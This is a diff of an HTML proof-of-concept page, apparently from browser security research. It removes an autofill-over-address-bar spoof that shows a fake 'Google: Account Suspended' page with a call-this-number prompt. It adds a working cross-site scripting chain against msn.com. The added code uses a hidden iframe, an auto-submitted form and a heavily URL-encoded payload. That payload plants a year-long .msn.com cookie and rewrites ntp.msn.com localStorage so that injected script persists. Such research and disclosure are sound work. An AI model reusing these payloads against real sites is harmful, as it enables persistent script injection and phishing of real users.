@@ -1,103 +1,52 @@
-<!doctype html>
 <html>
 <head>
-<style>
-html { font-family: sans-serif; }
-body { overflow: hidden; }
-iframe.formFrame { width: 1px; height: 1px; opacity: 0.01; }
-#overlayElem {
-  position: absolute; opacity: 0.001; cursor: default; z-index: 5;
-  height: 2px;
-  width: 200px;
-  top: -37px;
-  left: 290px;
-}
 
-#instructions { text-align: center; margin-top: 200px; font-size: 2em; }
-#instructions.hide { display: none; }
-
-#spoofContent { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; font-weight: bold; padding: 0.5em; }
-#spoofContent.show { display: block; }
-</style>
-</head>
 <body>
-<h1>PoC: Autofill over browser UI, address bar</h1>
-<p>Autofill prompt covers address bar, and probably can cover other browser UI.</p>
-
-<p id="output"></p>
-
-<p id="instructions">Please press space once to continue to Google<br>(or press down arrow once)</p>
-
-<input type="text" id="overlayElem" name="alesandroortiz[unique2addressBar]" autofocus autocomplete="on">
-
-<div id="spoofContent">
-<h1>Google: Account Suspended</h1>
-<p>Please call 800-555-5555 to verify and restore your account.</p>
-</div>
-
-<script>
-const trustedOrigin = 'https://alesandroortiz.com';
-
-var barStatusString = 'addressBar';
-
-// Clear value on reload
-overlayElem.value = '';
-
-var createAutofillEntryViaFrame = (entry) => {
-  var frameElem = document.createElement('iframe');
-  frameElem.classList.add('formFrame');
-  frameElem.addEventListener('load', (event) => {
-    if (event.target.contentWindow.location.search.indexOf('submitted') > -1) {
-      // After form submit, remove frame
-      event.target.remove();
-      return;
+<iframe src="about:blank" id="qframe" name="msn" style="opacity:0.001"></iframe>
+<h1>Loading...(ETA 42secs)</h2>
+<form id="qform" target="msn" action="http://technology.za.msn.com/pebble.asp?relid=172" method="post">
+<!--
+Encoded payload (Executes in 'technology.za.msn.com')
+---------------------------------------------------------------------
+(qd = new Date()).setMonth(qd.getMonth() + 12);
+document.cookie = "domainId=" + 
+				  ('q"*' 
+				  + unescape('%71%22%2a%66%75%6e%63%74%69%6f%6e%28%29%7b%66%6f%72%28%71%20%69%6e%20%6c%6f%63%61%6c%53%74%6f%72%61%67%65%29%7b%69%66%28%71%2e%69%6e%64%65%78%4f%66%28%27%6c%61%73%74%4b%6e%6f%77%6e%27%29%3e%2d%31%29%7b%77%69%74%68%28%71%6e%74%70%6f%62%6a%3d%4a%53%4f%4e%2e%70%61%72%73%65%28%6c%6f%63%61%6c%53%74%6f%72%61%67%65%5b%71%5d%29%29%7b%71%6e%74%70%6f%62%6a%2e%64%6f%6d%3d%75%6e%65%73%63%61%70%65%28%27%25%33%63%25%35%33%25%37%36%25%34%37%25%32%66%25%34%66%25%36%65%25%34%63%25%36%66%25%34%31%25%36%34%25%33%64%25%32%37%25%36%34%25%36%66%25%36%33%25%37%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%65%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%32%38%25%32%66%25%34%30%25%37%31%25%36%31%25%36%32%25%32%66%25%32%65%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%32%39%25%32%37%25%33%65%27%29%2b%71%6e%74%70%6f%62%6a%2e%64%6f%6d%7d%77%69%74%68%28%71%61%62%3d%71%6e%74%70%6f%62%6a%29%7b%6c%6f%63%61%6c%53%74%6f%72%61%67%65%5b%71%5d%3d%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%71%61%62%29%7d%7d%7d%7d%28%29%2a%22%71') 
+				  + '*"q') 
+				  + ";expires=" 
+				  + qd 
+				  + ";domain=.msn.com;path=/";
+---------------------------------------------------------------------
+unescaped value above (Executes in broken 'ntp.msn.com'), this is all one line and im using with(){} a lot because semicolon not allowed.
+---------------------------------------------------------------------
+function() {
+		for (q in localStorage) {
+        if (q.indexOf('lastKnown') > -1) {
+            with(qntpobj = JSON.parse(localStorage[q])) {
+                qntpobj.dom = unescape('%3c%53%76%47%2f%4f%6e%4c%6f%41%64%3d%27%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%2f%40%71%61%62%2f%2e%73%6f%75%72%63%65%29%27%3e') + qntpobj.dom
+            }
+            with(qab = qntpobj) {
+                localStorage[q] = JSON.stringify(qab)
+            }
+        }
     }
-    event.target.contentWindow.postMessage({"entry": entry, "fieldSuffix": '2'+barStatusString}, trustedOrigin);
-  });
-  document.body.appendChild(frameElem); 
-  frameElem.src = 'autofill-setup-frame.html';
+		
+}()
+---------------------------------------------------------------------
+unescaped value above (Executes in normal 'ntp.msn.com')
+---------------------------------------------------------------------
+<SvG/OnLoAd='document.write(/@qab/.source)'>
+-->  <input  type="hidden" name="startnum" value="90'<SvG/onLoAd=eval(unescape('%28%71%64%3d%20%6e%65%77%20%44%61%74%65%28%29%29%2e%73%65%74%4d%6f%6e%74%68%28%71%64%2e%67%65%74%4d%6f%6e%74%68%28%29%20%2b%20%31%32%29%3b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3d%22%64%6f%6d%61%69%6e%49%64%3d%22%2b%28%75%6e%65%73%63%61%70%65%28%27%25%37%31%25%32%32%25%32%61%25%36%36%25%37%35%25%36%65%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%32%38%25%32%39%25%37%62%25%36%36%25%36%66%25%37%32%25%32%38%25%37%31%25%32%30%25%36%39%25%36%65%25%32%30%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%35%33%25%37%34%25%36%66%25%37%32%25%36%31%25%36%37%25%36%35%25%32%39%25%37%62%25%36%39%25%36%36%25%32%38%25%37%31%25%32%65%25%36%39%25%36%65%25%36%34%25%36%35%25%37%38%25%34%66%25%36%36%25%32%38%25%32%37%25%36%63%25%36%31%25%37%33%25%37%34%25%34%62%25%36%65%25%36%66%25%37%37%25%36%65%25%32%37%25%32%39%25%33%65%25%32%64%25%33%31%25%32%39%25%37%62%25%37%37%25%36%39%25%37%34%25%36%38%25%32%38%25%37%31%25%36%65%25%37%34%25%37%30%25%36%66%25%36%32%25%36%61%25%33%64%25%34%61%25%35%33%25%34%66%25%34%65%25%32%65%25%37%30%25%36%31%25%37%32%25%37%33%25%36%35%25%32%38%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%35%33%25%37%34%25%36%66%25%37%32%25%36%31%25%36%37%25%36%35%25%35%62%25%37%31%25%35%64%25%32%39%25%32%39%25%37%62%25%37%31%25%36%65%25%37%34%25%37%30%25%36%66%25%36%32%25%36%61%25%32%65%25%36%34%25%36%66%25%36%64%25%33%64%25%37%35%25%36%65%25%36%35%25%37%33%25%36%33%25%36%31%25%37%30%25%36%35%25%32%38%25%32%37%25%32%35%25%33%33%25%36%33%25%32%35%25%33%35%25%33%33%25%32%35%25%33%37%25%33%36%25%32%35%25%33%34%25%33%37%25%32%35%25%33%32%25%36%36%25%32%35%25%33%34%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%34%25%36%33%25%32%35%25%33%36%25%36%36%25%32%35%25%33%34%25%33%31%25%32%35%25%33%36%25%33%34%25%32%35%25%33%33%25%36%34%25%32%35%25%33%32%25%33%37%25%32%35%25%33%36%25%33%34%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%34%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%36%35%25%32%35%25%33%37%25%33%37%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%39%25%32%35%25%33%37%25%33%34%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%38%25%32%35%25%33%32%25%36%36%25%32%35%25%33%34%25%33%30%25%32%35%25%33%37%25%33%31%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%33%32%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%35%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%36%36%25%32%35%25%33%37%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%33%37%25%32%35%25%33%33%25%36%35%25%32%37%25%32%39%25%32%62%25%37%31%25%36%65%25%37%34%25%37%30%25%36%66%25%36%32%25%36%61%25%32%65%25%36%34%25%36%66%25%36%64%25%37%64%25%37%37%25%36%39%25%37%34%25%36%38%25%32%38%25%37%31%25%36%31%25%36%32%25%33%64%25%37%31%25%36%65%25%37%34%25%37%30%25%36%66%25%36%32%25%36%61%25%32%39%25%37%62%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%35%33%25%37%34%25%36%66%25%37%32%25%36%31%25%36%37%25%36%35%25%35%62%25%37%31%25%35%64%25%33%64%25%34%61%25%35%33%25%34%66%25%34%65%25%32%65%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%36%39%25%36%36%25%37%39%25%32%38%25%37%31%25%36%31%25%36%32%25%32%39%25%37%64%25%37%64%25%37%64%25%37%64%25%32%38%25%32%39%25%32%61%25%32%32%25%37%31%27%29%29%2b%22%3b%65%78%70%69%72%65%73%3d%22%2b%71%64%2b%22%3b%64%6f%6d%61%69%6e%3d%2e%6d%73%6e%2e%63%6f%6d%3b%70%61%74%68%3d%2f%22%3b'))">
+  
+</form>
+<script>
+qframe.onload=e=>{
+ setTimeout(function(){
+ location="https://ntp.msn.com/compass/antp?locale=qab&dsp=1&sp=qabzz";
+ },1000)
 }
 
-// In Firefox, the entries seem to be alphabetically ordered. Therefore entries need to be carefully worded.
-// There may be a way to avoid this, but I haven't figured it out yet.
-createAutofillEntryViaFrame('https://www.google.com/verify');
-
-overlayElem.addEventListener('keydown', (event) => {
-
-  // Do not allow other values to be entered using keyboard
-  overlayElem.value = '';
-
-  // Only process space or down arrow
-  if (event.keyCode != 32 && event.keyCode != 40) {
-    return;
-  }
-
-  instructions.classList.add('hide');
-
-  history.pushState({}, 'Google: Account Suspended', '/verify');
-  document.title = 'Google: Account Suspended';
-  spoofContent.classList.add('show');
-});
-
-setInterval(() => {
-  // If user clicks autofill value, reset
-  // Cannot use change event because it doesn't fire immediately
-  if (overlayElem.value.length > 1) {
-    window.location.reload();
-  } else {
-    overlayElem.focus();
-  }
-}, 100);
-
-var reloadDebounceTimer;
-window.addEventListener('resize', (event) => {
-  clearTimeout(reloadDebounceTimer);
-  reloadDebounceTimer = setTimeout(() => {
-    window.location.reload();
-  }, 300);
-});
-
+qform.submit();
 </script>
-
 </body>
 </html>
